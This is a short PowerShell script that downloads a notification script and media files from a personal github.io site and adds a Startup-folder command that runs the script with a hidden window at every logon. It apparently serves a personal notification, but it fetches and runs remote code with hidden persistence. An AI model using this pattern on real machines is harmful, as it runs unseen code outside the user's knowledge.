function download_from_web {
    param (
        $url,
        $path
        )

    curl -Uri $url -OutFile $path

}


$user_name = $env:UserName
$root = "C:\Users\" + $user_name + "\.proposal_thomas"

$run_file_cmd_comand = "PowerShell -windowstyle hidden " 
$notification_file = $root + "\notification_script.ps1 "

$startup_file_location = "C:\Users\" + $user_name + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
$file_name = "script_for_notifications.cmd"
 
New-Item -Path $startup_file_location -Name $file_name -ItemType "file" -Value ($run_file_cmd_comand + $notification_file) -Force


download_from_web -url "https://thomatrixting.github.io/files/notification_script.ps1" -path ($notification_file)
download_from_web -url "https://thomatrixting.github.io/files/notifications_df.txt" -path ($root+"\notifications_df.txt")
download_from_web -url "https://thomatrixting.github.io/files/images/nagito_notification.ico" -path ($root+"\images\nagito_notification.ico")
download_from_web -url "https://thomatrixting.github.io/files/audios/notification_audio.mp3" -path ($root + "\audios\notification_audio.mp3")


cmd.exe /c ($startup_file_location+"\"+$file_name)